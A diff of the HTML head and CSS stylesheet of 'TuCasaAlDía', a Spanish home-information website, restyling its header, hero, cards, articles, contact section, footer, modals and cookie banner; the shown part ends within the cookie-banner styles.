@@ -1,1957 +1,3541 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
+    <meta charset="UTF-8">
 
-<meta charset="UTF-8">
+    <meta name="viewport"
+          content="width=device-width, initial-scale=1.0">
 
-<meta name="viewport"
-      content="width=device-width, initial-scale=1.0">
+    <meta name="description"
+          content="TuCasaAlDía es un sitio informativo con contenidos y consejos generales sobre organización, mantenimiento y cuidado del hogar.">
 
-<title>
-TuCasaAlDía | Información y consejos para el hogar
-</title>
+    <meta name="robots"
+          content="index, follow">
 
-<meta name="description"
-      content="TuCasaAlDía ofrece información general sobre administración del hogar, limpieza de casas, mantenimiento, organización y cuidado de viviendas.">
+    <title>TuCasaAlDía | Información para tu hogar</title>
 
-<meta name="robots"
-      content="index, follow">
+    <style>
 
-<meta name="author"
-      content="TuCasaAlDía">
+        /* =========================
+           RESET
+        ========================= */
 
-<link rel="canonical"
-      href="https://tucasaaldiajelpit.vercel.app/">
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-<style>
+        html {
+            scroll-behavior: smooth;
+        }
 
-/* =====================================================
-   CONFIGURACIÓN GENERAL
-===================================================== */
+        body {
+            font-family:
+                Inter,
+                -apple-system,
+                BlinkMacSystemFont,
+                "Segoe UI",
+                Roboto,
+                Arial,
+                sans-serif;
 
-* {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-}
+            background: #f7f8fa;
+            color: #172033;
+            line-height: 1.6;
+        }
 
-html {
-    scroll-behavior: smooth;
-}
+        body.cookie-open {
+            overflow: hidden;
+        }
 
-body {
-    font-family:
-        Inter,
-        -apple-system,
-        BlinkMacSystemFont,
-        "Segoe UI",
-        Roboto,
-        Arial,
-        sans-serif;
+        a {
+            color: inherit;
+            text-decoration: none;
+        }
 
-    background: #f7f8fa;
-    color: #172033;
+        button {
+            font: inherit;
+        }
 
-    line-height: 1.6;
-}
+        :root {
+            --primary: #3156d3;
+            --primary-dark: #2443ad;
+            --primary-light: #eef2ff;
 
-body.no-scroll {
-    overflow: hidden;
-}
+            --text: #172033;
+            --muted: #657084;
 
-a {
-    color: inherit;
-    text-decoration: none;
-}
+            --white: #ffffff;
+            --border: #e5e8ef;
 
-button {
-    font: inherit;
-}
+            --background: #f7f8fa;
 
-:root {
-    --primary: #3156d3;
-    --primary-dark: #2444b3;
-    --primary-light: #eef2ff;
+            --max-width: 1160px;
+            --radius: 18px;
+        }
 
-    --text: #172033;
-    --muted: #667085;
 
-    --white: #ffffff;
+        /* =========================
+           CONTAINER
+        ========================= */
 
-    --border: #e5e7eb;
+        .container {
+            width: min(
+                calc(100% - 40px),
+                var(--max-width)
+            );
 
-    --dark: #121a2a;
+            margin: auto;
+        }
 
-    --max-width: 1160px;
 
-    --radius: 18px;
-}
+        /* =========================
+           HEADER
+        ========================= */
 
+        .header {
+            position: sticky;
+            top: 0;
+            z-index: 100;
 
-/* =====================================================
-   CONTENEDOR
-===================================================== */
+            background: rgba(255,255,255,.96);
 
-.container {
-    width: min(
-        calc(100% - 40px),
-        var(--max-width)
-    );
+            border-bottom:
+                1px solid var(--border);
 
-    margin: 0 auto;
-}
+            backdrop-filter: blur(10px);
+        }
 
+        .header-inner {
+            min-height: 72px;
 
-/* =====================================================
-   HEADER
-===================================================== */
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
 
-.header {
-    position: sticky;
+            gap: 30px;
+        }
 
-    top: 0;
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 11px;
 
-    z-index: 100;
+            font-size: 21px;
+            font-weight: 800;
 
-    background:
-        rgba(255,255,255,.97);
+            letter-spacing: -.5px;
 
-    border-bottom:
-        1px solid var(--border);
+            white-space: nowrap;
+        }
 
-    backdrop-filter:
-        blur(10px);
-}
+        .logo-icon {
+            width: 39px;
+            height: 39px;
 
-.header-inner {
-    min-height: 72px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
 
-    display: flex;
+            border-radius: 11px;
 
-    align-items: center;
+            background: var(--primary);
+            color: white;
 
-    justify-content: space-between;
+            font-size: 18px;
+        }
 
-    gap: 30px;
-}
+        .logo span {
+            color: var(--primary);
+        }
 
-.logo {
-    display: flex;
+        .nav {
+            display: flex;
+            align-items: center;
+            gap: 28px;
+        }
 
-    align-items: center;
+        .nav a {
+            color: #566174;
 
-    gap: 10px;
+            font-size: 14px;
+            font-weight: 600;
 
-    font-size: 20px;
+            transition: .2s;
+        }
 
-    font-weight: 800;
+        .nav a:hover {
+            color: var(--primary);
+        }
 
-    white-space: nowrap;
-}
+        .menu-button {
+            display: none;
 
-.logo-icon {
-    width: 39px;
-    height: 39px;
+            width: 42px;
+            height: 42px;
 
-    display: flex;
+            border:
+                1px solid var(--border);
 
-    align-items: center;
-    justify-content: center;
+            background: white;
 
-    background:
-        var(--primary);
+            border-radius: 10px;
 
-    color: white;
+            cursor: pointer;
 
-    border-radius: 11px;
+            color: var(--text);
+        }
 
-    font-size: 20px;
-}
 
-.logo span {
-    color: var(--primary);
-}
+        /* =========================
+           HERO
+        ========================= */
 
+        .hero {
+            background: white;
 
-/* =====================================================
-   NAV
-===================================================== */
+            border-bottom:
+                1px solid var(--border);
+        }
 
-.nav {
-    display: flex;
+        .hero-content {
+            min-height: 500px;
 
-    align-items: center;
+            display: grid;
 
-    gap: 27px;
-}
+            grid-template-columns:
+                1.15fr .85fr;
 
-.nav a {
-    color: #566174;
+            align-items: center;
 
-    font-size: 14px;
+            gap: 70px;
 
-    font-weight: 600;
+            padding:
+                70px 0;
+        }
 
-    transition: .2s;
-}
+        .hero-label {
+            display: inline-flex;
+            align-items: center;
 
-.nav a:hover {
-    color: var(--primary);
-}
+            gap: 8px;
 
-.menu-button {
-    display: none;
+            padding:
+                7px 12px;
 
-    width: 42px;
-    height: 42px;
+            margin-bottom: 22px;
 
-    border:
-        1px solid var(--border);
+            background:
+                var(--primary-light);
 
-    background:
-        white;
+            color:
+                var(--primary);
 
-    border-radius: 10px;
+            border-radius: 30px;
 
-    cursor: pointer;
+            font-size: 12px;
+            font-weight: 700;
 
-    color: var(--text);
-}
+            letter-spacing: .3px;
+        }
 
+        .hero-label i {
+            width: 7px;
+            height: 7px;
 
-/* =====================================================
-   HERO
-===================================================== */
+            background: var(--primary);
 
-.hero {
-    background:
-        white;
+            border-radius: 50%;
+        }
 
-    border-bottom:
-        1px solid var(--border);
-}
+        .hero h1 {
+            max-width: 700px;
 
-.hero-content {
-    min-height: 510px;
+            font-size:
+                clamp(40px, 5vw, 65px);
 
-    display: grid;
+            line-height: 1.06;
 
-    grid-template-columns:
-        1.1fr .9fr;
+            letter-spacing: -2.5px;
 
-    align-items: center;
+            margin-bottom: 22px;
 
-    gap: 70px;
+            color: #111827;
+        }
 
-    padding:
-        75px 0;
-}
+        .hero h1 span {
+            color: var(--primary);
+        }
 
-.hero-label {
-    display: inline-flex;
+        .hero-text {
+            max-width: 610px;
 
-    align-items: center;
+            color: var(--muted);
 
-    gap: 8px;
+            font-size: 18px;
 
-    padding:
-        7px 12px;
+            margin-bottom: 30px;
+        }
 
-    margin-bottom: 20px;
+        .hero-actions {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
 
-    background:
-        var(--primary-light);
+        .button {
+            display: inline-flex;
 
-    color:
-        var(--primary);
+            align-items: center;
+            justify-content: center;
 
-    border-radius:
-        30px;
+            min-height: 48px;
 
-    font-size: 12px;
+            padding:
+                0 21px;
 
-    font-weight: 800;
-}
+            border-radius: 11px;
 
-.hero-label i {
-    width: 7px;
-    height: 7px;
+            font-size: 14px;
+            font-weight: 700;
 
-    background:
-        var(--primary);
+            border: 1px solid transparent;
 
-    border-radius: 50%;
-}
+            cursor: pointer;
 
-.hero h1 {
-    max-width: 700px;
+            transition: .2s;
+        }
 
-    font-size:
-        clamp(40px,5vw,64px);
+        .button-primary {
+            background: var(--primary);
+            color: white;
+        }
 
-    line-height:
-        1.06;
+        .button-primary:hover {
+            background: var(--primary-dark);
+            transform: translateY(-1px);
+        }
 
-    letter-spacing:
-        -2.5px;
+        .button-secondary {
+            background: white;
+            color: var(--text);
 
-    margin-bottom: 22px;
-}
+            border-color:
+                var(--border);
+        }
 
-.hero h1 span {
-    color:
-        var(--primary);
-}
+        .button-secondary:hover {
+            border-color: #c8ced9;
+            background: #fafbfc;
+        }
 
-.hero-text {
-    max-width: 620px;
 
-    color:
-        var(--muted);
+        /* =========================
+           HERO VISUAL
+        ========================= */
 
-    font-size: 18px;
+        .hero-card {
+            position: relative;
 
-    margin-bottom: 30px;
-}
+            min-height: 360px;
 
-.hero-actions {
-    display: flex;
+            border-radius: 28px;
 
-    flex-wrap: wrap;
+            background:
+                linear-gradient(
+                    145deg,
+                    #eef2ff,
+                    #f8fafc
+                );
 
-    gap: 12px;
-}
+            border:
+                1px solid #e1e6f4;
 
-.button {
-    min-height: 48px;
+            overflow: hidden;
 
-    display: inline-flex;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
 
-    align-items: center;
+        .house {
+            position: relative;
 
-    justify-content: center;
+            width: 210px;
+            height: 170px;
 
-    padding:
-        0 21px;
+            background: white;
 
-    border-radius: 11px;
+            border-radius:
+                14px 14px 10px 10px;
 
-    font-size: 14px;
+            box-shadow:
+                0 25px 60px
+                rgba(40,57,100,.12);
+        }
 
-    font-weight: 700;
+        .roof {
+            position: absolute;
 
-    cursor: pointer;
+            left: -20px;
+            top: -75px;
 
-    border:
-        1px solid transparent;
-}
+            width: 250px;
+            height: 150px;
 
-.button-primary {
-    background:
-        var(--primary);
+            background: var(--primary);
 
-    color:
-        white;
-}
+            transform:
+                rotate(45deg);
 
-.button-primary:hover {
-    background:
-        var(--primary-dark);
-}
+            border-radius: 20px;
+        }
 
-.button-secondary {
-    background:
-        white;
+        .door {
+            position: absolute;
 
-    color:
-        var(--text);
+            bottom: 0;
+            left: 83px;
 
-    border-color:
-        var(--border);
-}
+            width: 46px;
+            height: 78px;
 
+            background:
+                #26344f;
 
-/* =====================================================
-   ILUSTRACIÓN
-===================================================== */
+            border-radius:
+                8px 8px 0 0;
+        }
 
-.hero-card {
-    min-height: 365px;
+        .window {
+            position: absolute;
 
-    display: flex;
+            width: 42px;
+            height: 42px;
 
-    align-items: center;
+            top: 45px;
 
-    justify-content: center;
+            background:
+                #dbeafe;
 
-    overflow: hidden;
+            border:
+                5px solid #26344f;
 
-    border-radius: 28px;
+            border-radius: 7px;
+        }
 
-    background:
-        linear-gradient(
-            145deg,
-            #eef2ff,
-            #f8fafc
-        );
+        .window-one {
+            left: 25px;
+        }
 
-    border:
-        1px solid #e1e6f4;
-}
+        .window-two {
+            right: 25px;
+        }
 
-.house {
-    position: relative;
 
-    width: 210px;
-    height: 170px;
+        /* =========================
+           NOTICE
+        ========================= */
 
-    background:
-        white;
+        .notice {
+            padding: 18px 0;
+        }
 
-    border-radius:
-        14px 14px 10px 10px;
+        .notice-box {
+            display: flex;
 
-    box-shadow:
-        0 25px 60px
-        rgba(40,57,100,.12);
-}
+            gap: 15px;
 
-.roof {
-    position: absolute;
+            padding: 18px 20px;
 
-    left: -20px;
+            background: #fff;
 
-    top: -75px;
+            border:
+                1px solid var(--border);
 
-    width: 250px;
+            border-radius: 14px;
+        }
 
-    height: 150px;
+        .notice-icon {
+            flex-shrink: 0;
 
-    background:
-        var(--primary);
+            width: 36px;
+            height: 36px;
 
-    transform:
-        rotate(45deg);
+            border-radius: 10px;
 
-    border-radius:
-        20px;
-}
+            background:
+                #f1f5f9;
 
-.door {
-    position: absolute;
+            display: flex;
+            align-items: center;
+            justify-content: center;
 
-    left: 83px;
+            color: var(--primary);
 
-    bottom: 0;
+            font-weight: 800;
+        }
 
-    width: 46px;
+        .notice strong {
+            display: block;
 
-    height: 78px;
+            color: var(--text);
 
-    background:
-        #26344f;
+            font-size: 14px;
 
-    border-radius:
-        8px 8px 0 0;
-}
+            margin-bottom: 2px;
+        }
 
-.window {
-    position: absolute;
+        .notice p {
+            color: var(--muted);
 
-    top: 45px;
+            font-size: 13px;
+        }
 
-    width: 42px;
 
-    height: 42px;
+        /* =========================
+           SECTION
+        ========================= */
 
-    background:
-        #dbeafe;
+        .section {
+            padding:
+                80px 0;
+        }
 
-    border:
-        5px solid #26344f;
+        .section-header {
+            max-width: 650px;
 
-    border-radius: 7px;
-}
+            margin-bottom: 38px;
+        }
 
-.window-one {
-    left: 25px;
-}
+        .section-tag {
+            display: inline-block;
 
-.window-two {
-    right: 25px;
-}
+            color: var(--primary);
 
+            background:
+                var(--primary-light);
 
-/* =====================================================
-   AVISO INFORMATIVO
-===================================================== */
+            padding:
+                6px 11px;
 
-.notice {
-    padding:
-        18px 0;
-}
+            border-radius: 30px;
 
-.notice-box {
-    display: flex;
+            font-size: 11px;
+            font-weight: 800;
 
-    gap: 15px;
+            letter-spacing: .5px;
 
-    padding:
-        18px 20px;
+            margin-bottom: 12px;
+        }
 
-    background:
-        white;
+        .section h2 {
+            font-size:
+                clamp(30px,4vw,43px);
 
-    border:
-        1px solid var(--border);
+            line-height: 1.15;
 
-    border-radius:
-        14px;
-}
+            letter-spacing:
+                -1.3px;
 
-.notice-icon {
-    width: 36px;
-    height: 36px;
+            color: #111827;
 
-    flex-shrink: 0;
+            margin-bottom: 10px;
+        }
 
-    display: flex;
+        .section-header p {
+            color: var(--muted);
+        }
 
-    align-items: center;
-    justify-content: center;
 
-    background:
-        #f1f5f9;
+        /* =========================
+           CARDS
+        ========================= */
 
-    color:
-        var(--primary);
+        .cards {
+            display: grid;
 
-    border-radius:
-        10px;
+            grid-template-columns:
+                repeat(3, 1fr);
 
-    font-weight:
-        800;
-}
+            gap: 18px;
+        }
 
-.notice strong {
-    display: block;
+        .card {
+            background: white;
 
-    font-size: 14px;
+            border:
+                1px solid var(--border);
 
-    margin-bottom: 2px;
-}
+            border-radius:
+                var(--radius);
 
-.notice p {
-    color:
-        var(--muted);
+            padding: 27px;
 
-    font-size: 13px;
-}
+            transition:
+                transform .25s,
+                box-shadow .25s,
+                border-color .25s;
+        }
 
+        .card:hover {
+            transform:
+                translateY(-5px);
 
-/* =====================================================
-   SECCIONES
-===================================================== */
+            border-color:
+                #d5daf0;
 
-.section {
-    padding:
-        80px 0;
-}
+            box-shadow:
+                0 18px 45px
+                rgba(20,30,60,.07);
+        }
 
-.section-header {
-    max-width: 720px;
+        .card-icon {
+            width: 48px;
+            height: 48px;
 
-    margin-bottom:
-        38px;
-}
+            display: flex;
+            align-items: center;
+            justify-content: center;
 
-.section-tag {
-    display: inline-block;
+            border-radius: 13px;
 
-    padding:
-        6px 11px;
+            background:
+                var(--primary-light);
 
-    margin-bottom:
-        12px;
+            color:
+                var(--primary);
 
-    background:
-        var(--primary-light);
+            font-size: 20px;
 
-    color:
-        var(--primary);
+            margin-bottom: 20px;
+        }
 
-    border-radius:
-        30px;
+        .card h3 {
+            font-size: 18px;
 
-    font-size: 11px;
+            margin-bottom: 9px;
 
-    font-weight:
-        800;
+            color: #172033;
+        }
 
-    letter-spacing:
-        .5px;
-}
+        .card p {
+            font-size: 14px;
 
-.section h2 {
-    font-size:
-        clamp(30px,4vw,43px);
+            color: var(--muted);
 
-    line-height:
-        1.15;
+            line-height: 1.7;
+        }
 
-    letter-spacing:
-        -1.3px;
 
-    margin-bottom:
-        10px;
-}
+        /* =========================
+           ARTICLES
+        ========================= */
 
-.section-header p {
-    color:
-        var(--muted);
-}
+        .articles {
+            background: white;
 
+            border-top:
+                1px solid var(--border);
 
-/* =====================================================
-   TARJETAS
-===================================================== */
+            border-bottom:
+                1px solid var(--border);
+        }
 
-.cards {
-    display: grid;
+        .article-grid {
+            display: grid;
 
-    grid-template-columns:
-        repeat(3,1fr);
+            grid-template-columns:
+                repeat(3,1fr);
 
-    gap: 18px;
-}
+            gap: 20px;
+        }
 
-.card {
-    padding:
-        27px;
+        .article {
+            border:
+                1px solid var(--border);
 
-    background:
-        white;
+            border-radius:
+                var(--radius);
 
-    border:
-        1px solid var(--border);
+            overflow: hidden;
 
-    border-radius:
-        var(--radius);
+            background: white;
+        }
 
-    transition:
-        .25s;
-}
+        .article-top {
+            height: 125px;
 
-.card:hover {
-    transform:
-        translateY(-5px);
+            background:
+                linear-gradient(
+                    135deg,
+                    #eef2ff,
+                    #f8fafc
+                );
 
-    box-shadow:
-        0 18px 45px
-        rgba(20,30,60,.07);
-}
+            display: flex;
+            align-items: center;
+            justify-content: center;
 
-.card-icon {
-    width: 48px;
-    height: 48px;
+            color:
+                var(--primary);
 
-    display: flex;
+            font-size: 34px;
+        }
 
-    align-items: center;
-    justify-content: center;
+        .article-body {
+            padding: 23px;
+        }
 
-    margin-bottom:
-        20px;
+        .article-label {
+            font-size: 11px;
 
-    background:
-        var(--primary-light);
+            font-weight: 800;
 
-    color:
-        var(--primary);
+            color:
+                var(--primary);
 
-    border-radius:
-        13px;
+            text-transform: uppercase;
 
-    font-size:
-        20px;
-}
+            letter-spacing: .5px;
 
-.card h3 {
-    font-size:
-        18px;
+            margin-bottom: 7px;
+        }
 
-    margin-bottom:
-        9px;
-}
+        .article h3 {
+            font-size: 18px;
 
-.card p {
-    color:
-        var(--muted);
+            line-height: 1.35;
 
-    font-size:
-        14px;
-}
+            margin-bottom: 8px;
+        }
 
+        .article p {
+            color: var(--muted);
 
-/* =====================================================
-   ARTÍCULOS
-===================================================== */
+            font-size: 14px;
+        }
 
-.articles {
-    background:
-        white;
 
-    border-top:
-        1px solid var(--border);
+        /* =========================
+           ABOUT
+        ========================= */
 
-    border-bottom:
-        1px solid var(--border);
-}
+        .about {
+            display: grid;
 
-.article-grid {
-    display: grid;
+            grid-template-columns:
+                1fr 1fr;
 
-    grid-template-columns:
-        repeat(3,1fr);
+            gap: 60px;
 
-    gap: 20px;
-}
+            align-items: center;
+        }
 
-.article {
-    overflow:
-        hidden;
+        .about-text p {
+            color: var(--muted);
 
-    background:
-        white;
+            margin-bottom: 17px;
 
-    border:
-        1px solid var(--border);
+            font-size: 15px;
+        }
 
-    border-radius:
-        var(--radius);
-}
+        .about-list {
+            background: white;
 
-.article-top {
-    height: 125px;
+            border:
+                1px solid var(--border);
 
-    display: flex;
+            border-radius:
+                var(--radius);
 
-    align-items: center;
+            padding: 28px;
+        }
 
-    justify-content: center;
+        .about-item {
+            display: flex;
 
-    background:
-        linear-gradient(
-            135deg,
-            #eef2ff,
-            #f8fafc
-        );
+            gap: 14px;
 
-    color:
-        var(--primary);
+            padding: 15px 0;
 
-    font-size:
-        34px;
-}
+            border-bottom:
+                1px solid var(--border);
+        }
 
-.article-body {
-    padding:
-        23px;
-}
+        .about-item:last-child {
+            border-bottom: none;
+        }
 
-.article-label {
-    margin-bottom:
-        7px;
+        .check {
+            width: 29px;
+            height: 29px;
 
-    color:
-        var(--primary);
+            flex-shrink: 0;
 
-    font-size:
-        11px;
+            border-radius: 8px;
 
-    font-weight:
-        800;
+            background:
+                var(--primary-light);
 
-    text-transform:
-        uppercase;
-}
+            color:
+                var(--primary);
 
-.article h3 {
-    font-size:
-        18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
 
-    line-height:
-        1.35;
+            font-size: 13px;
+            font-weight: 800;
+        }
 
-    margin-bottom:
-        8px;
-}
+        .about-item strong {
+            display: block;
 
-.article p {
-    color:
-        var(--muted);
+            font-size: 14px;
 
-    font-size:
-        14px;
-}
+            margin-bottom: 2px;
+        }
 
+        .about-item span {
+            color: var(--muted);
 
-/* =====================================================
-   TEMAS
-===================================================== */
+            font-size: 13px;
+        }
 
-.topic-section {
-    background:
-        #f7f8fa;
-}
 
-.topic-content {
-    display: grid;
+        /* =========================
+           CONTACT
+        ========================= */
 
-    grid-template-columns:
-        repeat(2,1fr);
+        .contact {
+            background:
+                #172033;
 
-    gap: 20px;
-}
+            color: white;
+        }
 
-.topic-box {
-    padding:
-        28px;
+        .contact-inner {
+            display: grid;
 
-    background:
-        white;
+            grid-template-columns:
+                1fr 1fr;
 
-    border:
-        1px solid var(--border);
+            gap: 60px;
 
-    border-radius:
-        var(--radius);
-}
+            align-items: center;
+        }
 
-.topic-box h3 {
-    margin-bottom:
-        10px;
+        .contact h2 {
+            color: white;
+        }
 
-    font-size:
-        19px;
-}
+        .contact p {
+            color:
+                #aeb7c8;
 
-.topic-box p {
-    color:
-        var(--muted);
+            max-width: 530px;
+        }
 
-    font-size:
-        14px;
+        .contact-box {
+            background:
+                rgba(255,255,255,.06);
 
-    line-height:
-        1.75;
-}
+            border:
+                1px solid
+                rgba(255,255,255,.1);
 
+            border-radius:
+                var(--radius);
 
-/* =====================================================
-   SOBRE NOSOTROS
-===================================================== */
+            padding: 28px;
+        }
 
-.about {
-    display: grid;
+        .contact-row {
+            display: flex;
 
-    grid-template-columns:
-        1fr 1fr;
+            gap: 14px;
 
-    gap:
-        60px;
+            padding: 14px 0;
 
-    align-items:
-        center;
-}
+            border-bottom:
+                1px solid
+                rgba(255,255,255,.09);
+        }
 
-.about-text p {
-    color:
-        var(--muted);
+        .contact-row:last-child {
+            border-bottom: none;
+        }
 
-    margin-bottom:
-        17px;
+        .contact-row-icon {
+            width: 38px;
+            height: 38px;
 
-    font-size:
-        15px;
-}
+            border-radius: 10px;
 
-.about-list {
-    padding:
-        28px;
+            background:
+                rgba(255,255,255,.08);
 
-    background:
-        white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
 
-    border:
-        1px solid var(--border);
+        .contact-row strong {
+            display: block;
 
-    border-radius:
-        var(--radius);
-}
+            font-size: 13px;
 
-.about-item {
-    display:
-        flex;
+            margin-bottom: 2px;
+        }
 
-    gap:
-        14px;
+        .contact-row span {
+            color: #aeb7c8;
 
-    padding:
-        15px 0;
+            font-size: 13px;
+        }
 
-    border-bottom:
-        1px solid var(--border);
-}
 
-.about-item:last-child {
-    border-bottom:
-        none;
-}
+        /* =========================
+           FOOTER
+        ========================= */
 
-.check {
-    width: 29px;
-    height: 29px;
+        footer {
+            background:
+                #101622;
 
-    flex-shrink:
-        0;
+            color:
+                #8993a5;
 
-    display:
-        flex;
+            padding:
+                35px 0;
+        }
 
-    align-items:
-        center;
+        .footer-top {
+            display: flex;
 
-    justify-content:
-        center;
+            justify-content: space-between;
 
-    background:
-        var(--primary-light);
+            gap: 30px;
 
-    color:
-        var(--primary);
+            padding-bottom: 28px;
 
-    border-radius:
-        8px;
+            border-bottom:
+                1px solid
+                rgba(255,255,255,.08);
+        }
 
-    font-weight:
-        800;
-}
+        .footer-brand {
+            max-width: 350px;
+        }
 
-.about-item strong {
-    display:
-        block;
+        .footer-brand .logo {
+            color: white;
 
-    margin-bottom:
-        3px;
-}
+            margin-bottom: 12px;
+        }
 
-.about-item span {
-    color:
-        var(--muted);
+        .footer-brand p {
+            font-size: 13px;
+        }
 
-    font-size:
-        13px;
-}
+        .footer-links {
+            display: flex;
 
+            gap: 70px;
+        }
 
-/* =====================================================
-   CONTACTO
-===================================================== */
+        .footer-links h4 {
+            color: white;
 
-.contact {
-    background:
-        var(--dark);
+            font-size: 12px;
 
-    color:
-        white;
-}
+            margin-bottom: 12px;
 
-.contact-inner {
-    display:
-        grid;
+            text-transform: uppercase;
 
-    grid-template-columns:
-        1fr 1fr;
+            letter-spacing: .5px;
+        }
 
-    gap:
-        60px;
+        .footer-links a,
+        .footer-links button {
+            display: block;
 
-    align-items:
-        center;
-}
+            background: none;
+            border: none;
 
-.contact h2 {
-    color:
-        white;
-}
+            color: #8993a5;
 
-.contact p {
-    max-width:
-        540px;
+            cursor: pointer;
 
-    color:
-        #aeb7c8;
-}
+            font-size: 13px;
 
-.contact-box {
-    padding:
-        28px;
+            margin-bottom: 8px;
 
-    background:
-        rgba(255,255,255,.06);
+            text-align: left;
+        }
 
-    border:
-        1px solid
-        rgba(255,255,255,.1);
+        .footer-links a:hover,
+        .footer-links button:hover {
+            color: white;
+        }
 
-    border-radius:
-        var(--radius);
-}
+        .footer-bottom {
+            padding-top: 22px;
 
-.contact-row {
-    display:
-        flex;
+            display: flex;
 
-    gap:
-        14px;
+            justify-content: space-between;
 
-    padding:
-        15px 0;
+            gap: 20px;
 
-    border-bottom:
-        1px solid
-        rgba(255,255,255,.09);
-}
+            font-size: 12px;
+        }
 
-.contact-row:last-child {
-    border-bottom:
-        none;
-}
 
-.contact-row strong {
-    display:
-        block;
+        /* =========================
+           MODALES
+        ========================= */
 
-    margin-bottom:
-        2px;
-}
+        .modal-bg {
+            display: none;
 
-.contact-row span {
-    color:
-        #aeb7c8;
+            position: fixed;
 
-    font-size:
-        13px;
-}
+            inset: 0;
 
+            z-index: 500;
 
-/* =====================================================
-   FOOTER
-===================================================== */
+            background:
+                rgba(15,23,42,.65);
 
-footer {
-    padding:
-        35px 0;
+            padding: 20px;
 
-    background:
-        #0d1421;
+            align-items: center;
+            justify-content: center;
+        }
 
-    color:
-        #8993a5;
-}
+        .modal-bg.active {
+            display: flex;
+        }
 
-.footer-top {
-    display:
-        flex;
+        .modal {
+            width: min(650px,100%);
 
-    justify-content:
-        space-between;
+            max-height:
+                85vh;
 
-    gap:
-        40px;
+            overflow-y: auto;
 
-    padding-bottom:
-        28px;
+            background: white;
 
-    border-bottom:
-        1px solid
-        rgba(255,255,255,.08);
-}
+            border-radius:
+                20px;
 
-.footer-brand {
-    max-width:
-        370px;
-}
+            box-shadow:
+                0 30px 80px
+                rgba(0,0,0,.25);
 
-.footer-brand .logo {
-    color:
-        white;
+            animation:
+                modalIn .2s ease;
+        }
 
-    margin-bottom:
-        12px;
-}
+        @keyframes modalIn {
 
-.footer-brand p {
-    font-size:
-        13px;
-}
+            from {
+                opacity: 0;
+                transform:
+                    translateY(15px)
+                    scale(.98);
+            }
 
-.footer-links {
-    display:
-        flex;
+            to {
+                opacity: 1;
+                transform:
+                    translateY(0)
+                    scale(1);
+            }
 
-    gap:
-        70px;
-}
+        }
 
-.footer-links h4 {
-    margin-bottom:
-        12px;
+        .modal-header {
+            display: flex;
 
-    color:
-        white;
+            justify-content: space-between;
 
-    font-size:
-        12px;
-}
+            align-items: center;
 
-.footer-links a,
-.footer-links button {
-    display:
-        block;
+            padding: 22px 25px;
 
-    margin-bottom:
-        8px;
+            border-bottom:
+                1px solid var(--border);
+        }
 
-    padding:
-        0;
+        .modal-header h3 {
+            font-size: 19px;
+        }
 
-    border:
-        none;
+        .modal-close {
+            width: 35px;
+            height: 35px;
 
-    background:
-        transparent;
+            border: none;
 
-    color:
-        #8993a5;
+            background:
+                #f1f5f9;
 
-    cursor:
-        pointer;
+            border-radius: 9px;
 
-    font-size:
-        13px;
+            cursor: pointer;
 
-    text-align:
-        left;
-}
+            font-size: 20px;
 
-.footer-links a:hover,
-.footer-links button:hover {
-    color:
-        white;
-}
+            color: #667085;
+        }
 
-.footer-bottom {
-    display:
-        flex;
+        .modal-content {
+            padding: 25px;
 
-    justify-content:
-        space-between;
+            color: var(--muted);
 
-    gap:
-        20px;
+            font-size: 14px;
+        }
 
-    padding-top:
-        22px;
+        .modal-content h4 {
+            color: var(--text);
 
-    font-size:
-        12px;
-}
+            margin:
+                18px 0 7px;
+        }
 
+        .modal-content h4:first-child {
+            margin-top: 0;
+        }
 
-/* =====================================================
-   MODALES
-===================================================== */
+        .modal-content p {
+            margin-bottom: 12px;
+        }
 
-.modal-bg {
-    position:
-        fixed;
 
-    inset:
-        0;
+        /* =========================
+           COOKIE BANNER
+        ========================= */
 
-    z-index:
-        500;
+        .cookie-banner {
+            position: fixed;
 
-    display:
-        none;
+            left: 20px;
+            right: 20px;
+            bottom: 20px;
 
-    align-items:
-        center;
+            z-index: 1000;
 
-    justify-content:
-        center;
+            max-width: 1080px;
 
-    padding:
-        20px;
+            margin: auto;
 
-    background:
-        rgba(15,23,42,.65);
-}
+            background:
+                #ffffff;
 
-.modal-bg.active {
-    display:
-        flex;
-}
+            border:
+                1px solid #dfe3eb;
 
-.modal {
-    width:
-        min(680px,100%);
+            border-radius:
+                18px;
 
-    max-height:
-        85vh;
+            box-shadow:
+                0 20px 60px
+                rgba(15,23,42,.18);
 
-    overflow-y:
-        auto;
+            padding: 20px;
 
-    background:
-        white;
+            display: none;
+        }
 
-    border-radius:
-        20px;
-}
+        .cookie-banner.show {
+            display: block;
+        }
 
-.modal-header {
-    display:
-        flex;
+        .cookie-content {
+            display: flex;
 
-    align-items:
-        center;
+            align-items: center;
 
-    justify-content:
-        space-between;
+            gap: 20px;
+        }
 
-    padding:
-        22px 25px;
+        .cookie-icon {
+            width: 45px;
+            height: 45px;
 
-    border-bottom:
-        1px solid var(--border);
-}
+            flex-shrink: 0;
 
-.modal-close {
-    width:
-        36px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
 
-    height:
-        36px;
+            border-radius: 12px;
 
-    border:
-        none;
+            background:
+                var(--primary-light);
 
-    background:
-        #f1f5f9;
+            font-size: 22px;
+        }
 
-    border-radius:
-        9px;
+        .cookie-text {
+            flex: 1;
+        }
 
-    cursor:
-        pointer;
+        .cookie-text h3 {
+            font-size: 16px;
 
-    font-size:
-        20px;
-}
+            color: var(--text);
 
-.modal-content {
-    padding:
-        25px;
+            margin-bottom: 4px;
+        }
 
-    color:
-        var(--muted);
+        .cookie-text p {
+            color: var(--muted);
 
-    font-size:
-        14px;
-}
+            font-size: 13px;
 
-.modal-content h4 {
-    margin:
-        20px 0 7px;
+            line-height: 1.55;
+        }
 
-    color:
-        var(--text);
-}
+        .cookie-text a {
+            color: var(--primary);
 
-.modal-content h4:first-child {
-    margin-top:
-        0;
-}
+            text-decoration: underline;
+        }
 
+        .cookie-actions {
+            display: flex;
 
-/* =====================================================
-   COOKIES
-===================================================== */
+            gap: 8px;
 
-.cookie-banner {
-    position:
-        fixed;
+            flex-shrink: 0;
 
-    left:
-        20px;
+            flex-wrap: wrap;
+        }
 
